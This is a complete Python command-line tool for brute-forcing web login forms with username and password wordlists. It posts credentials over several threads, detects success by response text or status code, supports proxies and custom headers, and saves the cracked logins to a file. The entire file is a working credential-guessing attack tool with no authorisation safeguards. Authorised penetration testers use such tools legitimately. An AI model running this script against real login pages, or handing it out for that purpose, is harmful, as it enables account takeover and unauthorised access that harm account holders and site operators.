import argparse
import json as json_mod
import os
import queue
import sys
import threading
import time

import requests

def try_credentials(url, username, password, successful_logins, lock, stop_event,
                    fail_string, success_string, status_code,
                    user_field, pass_field, use_json, timeout, session):
    """
    Tries a single set of credentials against the given URL.
    Returns True if the attempt was made (False if stop_event was already set).
    """
    if stop_event.is_set():
        return

    data = {user_field: username, pass_field: password}
    try:
        if use_json:
            response = session.post(url, json=data, timeout=timeout)
        else:
            response = session.post(url, data=data, timeout=timeout)
    except requests.RequestException as e:
        print(f"[ERROR] {username}:{password} — {e}")
        return

    if status_code:
        matched = response.status_code == status_code
    elif success_string:
        matched = success_string in response.text
    else:
        matched = fail_string not in response.text

    if matched:
        print(f"[+] Found: {username}:{password}")
        with lock:
            successful_logins.append((username, password))
        stop_event.set()

def worker(url, credentials_queue, total, attempted, successful_logins, lock, stop_event,
           fail_string, success_string, status_code,
           user_field, pass_field, use_json, wait, timeout, stop_on_success, session, verbose):
    """
    Pulls credentials from the queue and tests them until the queue is exhausted or stop_event is set.
    """
    while not stop_event.is_set():
        try:
            username, password = credentials_queue.get(block=False)
        except queue.Empty:
            break

        try_credentials(url, username, password, successful_logins, lock, stop_event,
                        fail_string, success_string, status_code,
                        user_field, pass_field, use_json, timeout, session)

        count = attempted.increment()
        if verbose:
            print(f"[{count}/{total}] {username}:{password}")
        else:
            print(f"\r[{count}/{total}] attempts", end="", flush=True)

        credentials_queue.task_done()

        if stop_on_success and stop_event.is_set():
            break
        if wait:
            time.sleep(wait)

class Counter:
    """Thread-safe counter."""
    def __init__(self):
        self._value = 0
        self._lock = threading.Lock()

    def increment(self):
        with self._lock:
            self._value += 1
            return self._value

    @property
    def value(self):
        return self._value

def build_session(user_agent, extra_headers, proxy):
    session = requests.Session()
    if user_agent:
        session.headers["User-Agent"] = user_agent
    for header in extra_headers:
        if ":" not in header:
            print(f"[WARN] Skipping malformed header (expected 'Key: Value'): {header}", file=sys.stderr)
            continue
        key, _, value = header.partition(":")
        session.headers[key.strip()] = value.strip()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    return session

def run_dictionary_attack(url, username_file, password_file, num_threads,
                          fail_string, success_string, status_code,
                          user_field, pass_field, use_json,
                          wait, timeout, output_file, stop_on_success,
                          user_agent, extra_headers, proxy, verbose):
    with open(username_file, "r") as f:
        usernames = [line.strip() for line in f if line.strip()]
    with open(password_file, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]

    credentials_queue = queue.Queue()
    for username in usernames:
        for password in passwords:
            credentials_queue.put((username, password))

    total = len(usernames) * len(passwords)
    attempted = Counter()
    successful_logins = []
    lock = threading.Lock()
    stop_event = threading.Event()
    session = build_session(user_agent, extra_headers, proxy)

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(
            target=worker,
            args=(url, credentials_queue, total, attempted, successful_logins, lock, stop_event,
                  fail_string, success_string, status_code,
                  user_field, pass_field, use_json, wait, timeout, stop_on_success, session, verbose),
        )
        t.daemon = True
        t.start()
        threads.append(t)

    credentials_queue.join()
    if not verbose:
        print()  # newline after progress line

    with open(output_file, "w") as f:
        for username, password in successful_logins:
            f.write(f"{username}:{password}\n")

    return len(usernames), len(passwords), successful_logins

def main():
    parser = argparse.ArgumentParser(description="Test login credentials using a dictionary attack.")
    parser.add_argument("url", help="The URL to test.")
    parser.add_argument("username_file", help="File containing usernames to test.")
    parser.add_argument("password_file", help="File containing passwords to test.")
    parser.add_argument("-t", "--threads", type=int, default=4, help="Number of threads (default: 4).")
    parser.add_argument("-w", "--wait", type=float, default=0.0, help="Seconds to wait between attempts per thread (default: 0).")
    parser.add_argument("--timeout", type=float, default=10.0, help="Request timeout in seconds (default: 10).")
    parser.add_argument("-f", "--fail-string", default="Login failed", help="Response text indicating a failed login (default: 'Login failed').")
    parser.add_argument("-s", "--success-string", default="", help="Response text indicating success (overrides --fail-string).")
    parser.add_argument("-c", "--status-code", type=int, default=0, help="HTTP status code indicating success (overrides string checks when set).")
    parser.add_argument("--user-field", default="username", help="Form field name for username (default: username).")
    parser.add_argument("--pass-field", default="password", help="Form field name for password (default: password).")
    parser.add_argument("--json", action="store_true", dest="use_json", help="Send credentials as a JSON body instead of form-encoded.")
    parser.add_argument("-x", "--stop-on-success", action="store_true", help="Stop all threads as soon as one valid credential is found.")
    parser.add_argument("-o", "--output", default="successful_logins.txt", help="Output file for successful logins (default: successful_logins.txt).")
    parser.add_argument("-A", "--user-agent", default="", help="Custom User-Agent header.")
    parser.add_argument("-H", "--header", action="append", default=[], metavar="KEY:VALUE", dest="headers", help="Extra HTTP header (repeatable, e.g. -H 'X-CSRF-Token: abc').")
    parser.add_argument("-p", "--proxy", default="", help="Proxy URL to route requests through (e.g. http://127.0.0.1:8080).")
    parser.add_argument("--https-only", action="store_true", help="Abort if the target URL is not HTTPS.")
    parser.add_argument("-v", "--verbose", action="store_true", help="Print every attempt instead of a rolling progress counter.")
    args = parser.parse_args()

    if not os.path.isfile(args.username_file):
        parser.error(f"Username file not found: {args.username_file}")
    if not os.path.isfile(args.password_file):
        parser.error(f"Password file not found: {args.password_file}")
    if args.threads < 1:
        parser.error("--threads must be at least 1.")
    if args.wait < 0:
        parser.error("--wait must be >= 0.")
    if args.https_only and not args.url.lower().startswith("https://"):
        parser.error("Target URL is not HTTPS. Remove --https-only or use an HTTPS URL.")

    start_time = time.time()
    num_usernames, num_passwords, hits = run_dictionary_attack(
        args.url, args.username_file, args.password_file, args.threads,
        args.fail_string, args.success_string, args.status_code,
        args.user_field, args.pass_field, args.use_json,
        args.wait, args.timeout, args.output, args.stop_on_success,
        args.user_agent, args.headers, args.proxy, args.verbose,
    )
    elapsed = time.time() - start_time
    num_credentials = num_usernames * num_passwords

    print(f"Tried {num_credentials} credentials in {elapsed:.2f}s "
          f"({num_credentials / elapsed:.2f} creds/sec).")
    print(f"Found {len(hits)} successful login(s). Results saved to {args.output}.")

if __name__ == "__main__":
    main()
